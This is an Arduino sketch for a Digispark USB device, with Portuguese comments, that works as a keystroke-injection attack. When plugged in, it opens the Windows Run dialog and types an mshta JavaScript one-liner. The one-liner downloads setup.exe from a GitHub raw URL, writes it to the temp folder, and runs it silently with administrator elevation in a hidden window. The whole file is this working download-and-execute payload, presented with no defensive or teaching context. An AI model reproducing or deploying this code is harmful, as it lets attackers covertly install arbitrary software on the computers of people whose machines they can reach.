#define LAYOUT_PORTUGUESE
#include "DigiKeyboard.h"

void setup() {
  // Aguarda um pouco antes de começar
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Digita o comando mshta com layout português
  DigiKeyboard.print("mshta \"javascript:");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("var x=new ActiveXObject('Microsoft.XMLHTTP');");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("x.open('GET','https://raw.githubusercontent.com/ctp-maker/Expoe/main/setup.exe',false);");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("x.send();");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("var s=new ActiveXObject('ADODB.Stream');");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("s.Type=1; s.Open(); s.Write(x.responseBody);");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("s.SaveToFile('%TEMP%\\\\setup.exe',2); s.Close();");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("var sh=new ActiveXObject('Shell.Application');");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("sh.ShellExecute('%TEMP%\\\\setup.exe','/S','','runas',0);");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("close();");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("\"");
  
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyPress(KEY_ENTER);
}

void loop() {
  // não faz nada depois
}
